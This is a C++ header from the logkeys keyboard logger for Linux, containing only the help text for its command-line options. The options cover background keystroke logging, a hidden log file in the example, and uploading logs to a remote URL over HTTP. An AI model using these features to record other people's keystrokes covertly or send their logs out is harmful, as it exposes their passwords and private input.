/*
  Copyleft (ɔ) 2009 Kernc
  This program is free software. It comes with absolutely no warranty whatsoever.
  See COPYING for further information.
  
  Project homepage: https://github.com/kernc/logkeys
*/

#ifndef _USAGE_H_
#define _USAGE_H_

namespace logkeys {

void usage()
{
  fprintf(stderr,
"Usage: logkeys [OPTION]...\n"
"Log depressed keyboard keys.\n"
"\n"
"  -s, --start               start logging keypresses\n"
"  -m, --keymap=FILE         use keymap FILE\n"
"  -o, --output=FILE         log output to FILE [" DEFAULT_LOG_FILE "] or standard output '-'\n"
"  -u, --us-keymap           use en_US keymap instead of configured default\n"
"  -k, --kill                kill running logkeys process\n"
"  -d, --device=FILE         input event device [eventX from " INPUT_EVENT_PATH "]\n"
"  -?, --help                print this help screen\n"
"      --export-keymap=FILE  export configured keymap to FILE and exit\n"
"      --no-func-keys        log only character keys\n"
"      --no-timestamps       don't prepend timestamps to log file lines\n"
"      --timestamp-every     log timestamp on every keystroke\n"
"      --post-http=URL       POST log to URL as multipart/form-data file\n"
//"      --post-irc=FORMAT     FORMAT is nick_or_channel@server:port\n"
"      --post-size=SIZE      post log file when size equals SIZE [500k]\n"
"      --no-daemon           run in foreground\n"
"\n"
"Examples: logkeys -s -m mylang.map -o ~/.secret-keys.log\n"
"          logkeys -s -d event6\n"
"          logkeys -k\n"
"\n"
"logkeys version: " PACKAGE_VERSION "\n"
"logkeys homepage: <https://github.com/kernc/logkeys/>\n"
  );
}

} // namespace logkeys

#endif  // _USAGE_H_
